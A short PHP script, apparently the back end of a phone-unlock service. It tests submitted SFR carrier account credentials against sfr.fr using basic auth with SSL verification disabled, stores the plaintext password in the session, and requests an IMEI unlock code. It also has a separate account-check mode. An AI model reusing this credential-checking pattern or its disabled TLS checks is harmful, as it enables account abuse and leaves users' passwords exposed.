<?php
if (isset($_REQUEST['user']) AND isset($_REQUEST['pass']) AND isset($_REQUEST['check']))
	 {
$user=trim($_REQUEST['user']);
$pass=$_REQUEST['pass'];
include("get_code.php");

	
	$url="https://www.sfr.fr/sfr-et-moi.html#sfrintid=V_head_deco";
	
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
	curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
	curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
	curl_setopt($ch, CURLOPT_HTTPAUTH, CURLAUTH_BASIC);
	curl_setopt($ch, CURLOPT_USERPWD, $user.":".$pass);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
    $result = curl_exec($ch);
   
        
		
		$pos = 0;
$pos = strpos($result, "Bad credentials");

	if($pos > 0)
		{
			$msg='INVALID';
		}
		
		
		
		 if ( $error = curl_error($ch) )
		{
		 $msg='INVALID';

		curl_close($ch); 
		}	
	if (strpos($result, "false") !== false)
		{
					session_start();
					if($_REQUEST['check']=='false')
					{
					$_SESSION['user'] = $user;
					$_SESSION['pass'] = $pass;
					$imei=get_imei();
					$_SESSION['imei_ctr']=$imei;
					// sleep(2);
					$_SESSION['nck'] =get_nck($imei,$user,$pass);
					parsing();
					$msg='OK';
					}
					else
					{
					$_SESSION['user_check'] = $user;
					$_SESSION['pass_check'] = $pass;
					//$imei=get_imei();
					//$_SESSION['imei_ctr']=$imei;
					// sleep(2);
					$_SESSION['nck_check'] ='ACCOUNT FOR CHECK';
					parsing();
					$msg='OK';
					}
					
					
		}
		else
		{
			$msg='INVALID';
		}
echo $msg;
}
		else
		{
		
		print("<script type=\"text/javascript\">setTimeout('location=(\"login.php\")' ,0);</script>");
		}
?>